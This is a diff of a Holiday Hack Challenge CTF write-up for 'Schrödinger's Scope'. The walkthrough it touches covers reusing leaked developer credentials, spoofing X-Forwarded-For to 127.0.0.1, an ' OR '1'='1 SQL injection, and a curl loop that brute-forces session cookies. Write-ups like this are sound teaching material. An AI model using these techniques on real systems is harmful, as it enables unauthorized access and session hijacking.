@@ -7,7 +7,7 @@ title: act3_schrodingersscope_mjd
 
 | Objective: Schrödinger's Scope   | Difficulty Level: 3 |
 | :-----------------------: | :--------------------------: |
-| Kevin in the Retro Store ponders pentest paradoxes—can you solve Schrödinger's Scope?| Location: Retro Store  |
+| Kevin in the Retro Store ponders pentest paradoxes-can you solve Schrödinger's Scope?| Location: Retro Store  |
 
 ## Solution Overview
 
@@ -27,13 +27,13 @@ The objective is to conduct a penetration test of a Neighborhood College Registr
 <summary>Click to expand</summary>
 
 The initial step was to identify the bot responsible for the additional scope violations
-  
-![Identification of WebBot](/images/shroedingers_webbot.jpg) 
+
+![Identification of WebBot](/images/shroedingers_webbot.jpg)
 
 With the object pattern identified, it is possible to use browser Developer Tools to block the request.
 Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "*gnomeU*"
 
-![Blocking of WebBot](/images/shroedingers_webbotblock.jpg) 
+![Blocking of WebBot](/images/shroedingers_webbotblock.jpg)
 
 Reconnaisance began with examining the contents of the sitemap for the application.
 The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934
@@ -56,7 +56,7 @@ http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset
-http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/ 
+http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/
 >http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report
@@ -70,7 +70,7 @@ http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev
-http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/ 
+http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
@@ -79,19 +79,19 @@ http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
 Exploring the endpoints revealed several pages of notes, two that were within the scope.
 The first enpoint found: /register/dev/dev_todos
 
-![Developer Information To Do List](/images/shroedingers_devtodos.jpg) 
+![Developer Information To Do List](/images/shroedingers_devtodos.jpg)
 
 The second endpoint found: /register/dev/dev_notes
 
-![Developer Information Notes](/images/shroedingers_devnotes.jpg) 
+![Developer Information Notes](/images/shroedingers_devnotes.jpg)
 
 Locating both of these files construct the Developer information disclosure vulnerability discovered.
 
 **Answer: Developer information disclosure**
 
-With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself. 
+With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself.
 
-![Spoofing the X-Forwarder Header](/images/shroedingers_xforwarder.jpg) 
+![Spoofing the X-Forwarder Header](/images/shroedingers_xforwarder.jpg)
 
 The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.
 
@@ -101,7 +101,7 @@ Spoofing the X-Forwarded-For header and authenticating as testuser achieves the 
 
 Examining the source code for the courses page, a commented secion of code is discovered.
 
-![Commented Search Feature](/images/shroedingers_commentedsearch.jpg) 
+![Commented Search Feature](/images/shroedingers_commentedsearch.jpg)
 
 Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:
 
@@ -128,13 +128,13 @@ fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Ty
 
 This activates the search feature in the application:
 
-![Activated Search Feature](/images/shroedingers_activatedsearch.jpg) 
+![Activated Search Feature](/images/shroedingers_activatedsearch.jpg)
 
 **Answer: Found commented code**
 
 Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.
 
-![Search SQL Injection](/images/shroedingers_searchsqli.jpg) 
+![Search SQL Injection](/images/shroedingers_searchsqli.jpg)
 
 **Answer: SQL Injection**
 
@@ -142,13 +142,13 @@ This reveals the unauthorized course and allows me to report it:
 ![Unauthorized Course](/images/shroedingers_mischief.jpg)
 
 Opening the course details prompts for reporting:
-![Unauthorized Course Details](/images/shroedingers_gnomecourse.jpg) 
+![Unauthorized Course Details](/images/shroedingers_gnomecourse.jpg)
 
 **Answer: Unauthorized content**
 
 The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.
 
-![Registration Value](/images/shroedingers_wipermissions.jpg) 
+![Registration Value](/images/shroedingers_wipermissions.jpg)
 
 Looking at the registration values generated:
 
@@ -171,7 +171,7 @@ registration	eb72a05369dcb443
 ```
 
 Only the last two digits change, this indicates there are only 256 variations.
-The TestUser needs to be logged in to test the registration values. 
+The TestUser needs to be logged in to test the registration values.
 Using this script to locate the valid session:
 
 ```sh
@@ -182,7 +182,7 @@ id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"
 
 for i in {0..255}; do
   hex=$(printf '%02x' $i)
-  
+
 # Login and access page in one flow
   response=$(curl -s -L \
     -H "X-Forwarded-For: 127.0.0.1" \
@@ -193,7 +193,7 @@ for i in {0..255}; do
     -H "X-Forwarded-For: 127.0.0.1" \
     -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
     "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")
-  
+
   if ! echo "$response" | grep -qi "invalid"; then
     echo "============================================"
     echo "VALID REGISTRATION COOKIE FOUND!"
@@ -219,10 +219,10 @@ This results in a VALID REGISTRATION COOKIE FOUND!
 registration=eb72a05369dcb44c
 
 Hijacking this session token, the document in wip is accessed.
- 
+
 **Answer: Cookie prediction**
 
-![Final Assessment Results](/images/shroedingers_final.jpg) 
+![Final Assessment Results](/images/shroedingers_final.jpg)
 
 </details>
 
@@ -230,7 +230,7 @@ Hijacking this session token, the document in wip is accessed.
 
 | Tools Used           | Tool Version |
 | :-----------------------: | :--------------------------------: |
-| Edge Developer Tools | Version 142.0.3595.53 | 
+| Edge Developer Tools | Version 142.0.3595.53 |
 | Burp Suite Community Edition | v2024.11.2 |
 
 
